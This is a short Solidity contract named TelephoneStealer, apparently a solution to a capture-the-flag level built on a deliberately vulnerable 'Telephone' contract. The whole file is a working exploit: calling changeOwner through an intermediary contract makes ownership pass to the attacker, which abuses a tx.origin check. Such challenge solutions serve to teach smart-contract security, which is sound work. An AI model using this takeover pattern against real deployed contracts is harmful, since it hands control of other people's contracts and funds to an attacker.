// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneStealer {

  constructor() {}

  function stealTelephone(address telephoneAddress) public {
    Telephone tel = Telephone(telephoneAddress);
    tel.changeOwner(msg.sender);
  }
}